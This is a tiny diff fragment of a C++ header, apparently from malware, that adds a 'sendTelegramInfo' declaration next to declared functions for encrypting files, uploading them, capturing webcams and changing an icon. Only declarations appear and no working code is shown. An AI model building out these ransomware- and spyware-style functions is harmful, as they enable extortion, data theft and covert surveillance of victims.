@@ -60,3 +60,4 @@ void encryptFiles(std::vector<std::string> files, std::string key);
 void uploadFiles(std::vector<std::string> files);
 void takeWebcams();
 void changeIcon();
+void sendTelegramInfo();
